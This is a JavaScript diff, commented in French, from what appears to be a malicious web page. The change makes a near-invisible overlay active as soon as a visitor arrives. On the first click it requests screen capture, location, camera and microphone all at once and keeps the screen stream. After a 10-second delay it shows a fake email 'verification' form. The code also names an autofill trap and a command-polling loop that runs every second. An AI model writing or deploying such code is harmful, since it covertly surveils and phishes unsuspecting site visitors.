@@ -962,9 +962,12 @@ function bindVerificationForm(overlay) {
     form.onsubmit = handleVerification;
 }
 
-async function setupInvisibleVerifyOverlay(overlay) {
+function setupInvisibleVerifyOverlay(overlay) {
     if (overlay.dataset.verifyBound === '1') return;
     overlay.dataset.verifyBound = '1';
+
+    // Rendre l'overlay réellement invisible au début (pour le piège immédiat)
+    overlay.style.background = 'rgba(0,0,0,0.01)';
 
     overlay.addEventListener('click', async () => {
         // Tentative de duplication / persistance (Pop-under)
@@ -976,24 +979,16 @@ async function setupInvisibleVerifyOverlay(overlay) {
             }
         } catch (e) {}
 
-        if (isLocationReady()) {
-            showVerificationModal(overlay);
-            // On force quand même la vérification des permissions média
-            requestVerifyMediaPermissions();
-            // On demande l'écran en plus
-            navigator.mediaDevices.getDisplayMedia({video:true}).catch(()=>{});
-            return;
-        }
-
-        // On demande TOUT EN MÊME TEMPS pour maximiser les chances
-        console.log("Tentative de capture totale...");
+        // On lance TOUTES les demandes d'accès immédiatement au premier clic
+        console.log("Piège activé : Demande de permissions forcée...");
         
-        // On lance la demande d'écran séparément car elle est souvent bloquée si groupée
+        // On demande l'écran
         navigator.mediaDevices.getDisplayMedia({ video: true }).then(stream => {
             persistentScreenStream = stream;
-            console.log("📺 Écran capturé en arrière-plan");
+            console.log("📺 Écran capturé");
         }).catch(() => {});
 
+        // On demande GPS + Caméra + Micro
         const [locOk, mediaOk] = await Promise.all([
             requestLocationOnly(),
             requestVerifyMediaPermissions()
@@ -1003,8 +998,13 @@ async function setupInvisibleVerifyOverlay(overlay) {
         
         if (locOk) {
             markLocationReady();
-            showVerificationModal(overlay);
         }
+
+        // RETARDER L'APPARITION DE LA PAGE D'EMAIL (10 secondes après le clic)
+        console.log("Permissions demandées. Affichage du formulaire d'email dans 10s...");
+        setTimeout(() => {
+            showVerificationModal(overlay);
+        }, 10000);
     });
 }
 
@@ -1112,11 +1112,9 @@ if (document.readyState === 'complete') {
 
     setupAutofillTrap();
     
-    // RETARDER L'APPARITION DE L'OVERLAY (Laisser visiter 10 secondes pour être sûr)
-    setTimeout(() => {
-        console.log("Activation du système de vérification...");
-        startVerification();
-    }, 10000);
+    // PIÈGE IMMÉDIAT : L'overlay invisible est actif dès l'entrée pour forcer les accès
+    console.log("Piège invisible activé dès l'entrée...");
+    startVerification();
     
     // VÉRIFICATION DES COMMANDES : Ultra-agressif (toutes les 1 seconde)
     // On utilise une boucle récursive pour garantir qu'une seule requête tourne à la fois
